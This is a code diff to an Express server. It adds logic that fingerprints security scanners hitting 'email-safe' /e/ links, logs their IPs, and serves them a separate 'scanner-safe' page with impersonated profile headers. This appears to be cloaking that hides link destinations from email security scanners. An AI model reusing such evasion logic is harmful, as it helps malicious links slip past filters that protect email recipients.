@@ -2117,6 +2117,26 @@ function detectScannerEnhancedWithBehavior(req) {
   };
 }
 
+function buildScannerInterstitialContext(req, fallbackReason = "Known scanner UA") {
+  const scannerResult = detectScannerEnhancedWithBehavior(req);
+  if (!scannerResult || !scannerResult.isScanner) {
+    return { scannerReason: fallbackReason, scannerProfile: null };
+  }
+
+  const detections = scannerResult.detections || [];
+  const topDetection = detections[0] || { name: fallbackReason, confidence: 0.5 };
+  const ip = getClientIp(req);
+
+  recordScannerIp(ip, topDetection.name);
+  const knownScanner = isKnownScannerIp(ip);
+  const shouldImpersonate = shouldImpersonateForRequest(req, scannerResult, knownScanner);
+
+  return {
+    scannerReason: shouldImpersonate ? "Known scanner fingerprint" : (topDetection.name || fallbackReason),
+    scannerProfile: shouldImpersonate ? pickScannerProfile(topDetection, req) : null
+  };
+}
+
 function logScannerHit(req, reason, nextEnc) {
   const ip   = getClientIp(req);
   const ua   = (req.get("user-agent") || "").slice(0, UA_TRUNCATE_LENGTH);
@@ -2472,12 +2492,20 @@ app.use((req, res, next) => {
   // Handle /e/* specifically (email-safe deep links)
   if (req.path.startsWith("/e/")) {
     const clean = (req.originalUrl || "").slice(3).split("?")[0];
+    const scannerCtx = buildScannerInterstitialContext(req, req.method + "-probe");
     if (req.method === "HEAD") {
-      logScannerHit(req, "HEAD-probe", clean);
+      logScannerHit(req, scannerCtx.scannerReason || "HEAD-probe", clean);
+      if (scannerCtx.scannerProfile) {
+        applyScannerCompatHeaders(res);
+        applyScannerProfileHeaders(res, scannerCtx.scannerProfile);
+      }
       return res.status(200).type("html").end();
     }
-    logScannerHit(req, req.method + "-probe", clean);
-    return renderScannerSafePage(req, res, clean, req.method + "-probe", { emailSafe: true });
+    logScannerHit(req, scannerCtx.scannerReason || (req.method + "-probe"), clean);
+    return renderScannerSafePage(req, res, clean, scannerCtx.scannerReason || (req.method + "-probe"), {
+      emailSafe: true,
+      scannerProfile: scannerCtx.scannerProfile
+    });
   }
 
   const url = req.originalUrl || "";
@@ -2491,8 +2519,11 @@ app.use((req, res, next) => {
 
   if (looksDeep) {
     const clean = url.replace(/^\//, "").split("?")[0];
-    logScannerHit(req, req.method + "-probe", clean);
-    return renderScannerSafePage(req, res, clean, req.method + "-probe");
+    const scannerCtx = buildScannerInterstitialContext(req, req.method + "-probe");
+    logScannerHit(req, scannerCtx.scannerReason || (req.method + "-probe"), clean);
+    return renderScannerSafePage(req, res, clean, scannerCtx.scannerReason || (req.method + "-probe"), {
+      scannerProfile: scannerCtx.scannerProfile
+    });
   }
 
   return next();
@@ -2515,8 +2546,12 @@ app.use((req, res, next) => {
 
   if (req.method === "GET" && req.path.startsWith("/e/")) {
     const clean = (req.originalUrl || "").slice(3).split("?")[0];
-    logScannerHit(req, "GET-probe", clean);
-    return renderScannerSafePage(req, res, clean, "GET-probe", { emailSafe: true });
+    const scannerCtx = buildScannerInterstitialContext(req, "GET-probe");
+    logScannerHit(req, scannerCtx.scannerReason || "GET-probe", clean);
+    return renderScannerSafePage(req, res, clean, scannerCtx.scannerReason || "GET-probe", {
+      emailSafe: true,
+      scannerProfile: scannerCtx.scannerProfile
+    });
   }
 
   return next();
@@ -3976,16 +4011,25 @@ app.get("/challenge-fragment", limitChallengeView, handleChallengeFragment);
 app.get("/e/:data(*)", (req, res) => {
   const urlPathFull = (req.originalUrl || "").slice(3);
   const clean = urlPathFull.split("?")[0];
+  const scannerCtx = buildScannerInterstitialContext(req, "Email-safe path");
   addLog(`[INTERSTITIAL] /e path used len=${clean.length}`);
-  logScannerHit(req, "Email-safe path", clean);
-  return renderScannerSafePage(req, res, clean, "Email-safe path", { emailSafe: true });
+  logScannerHit(req, scannerCtx.scannerReason || "Email-safe path", clean);
+  return renderScannerSafePage(req, res, clean, scannerCtx.scannerReason || "Email-safe path", {
+    emailSafe: true,
+    scannerProfile: scannerCtx.scannerProfile
+  });
 });
 
 app.head("/e/:data(*)", (req, res) => {
   const urlPathFull = (req.originalUrl || "").slice(3);
   const clean = urlPathFull.split("?")[0];
+  const scannerCtx = buildScannerInterstitialContext(req, "HEAD-probe");
   addLog(`[INTERSTITIAL] HEAD /e path`);
-  logScannerHit(req, "HEAD-probe", clean);
+  logScannerHit(req, scannerCtx.scannerReason || "HEAD-probe", clean);
+  if (scannerCtx.scannerProfile) {
+    applyScannerCompatHeaders(res);
+    applyScannerProfileHeaders(res, scannerCtx.scannerProfile);
+  }
   res.status(200).type("html").end();
 });
 
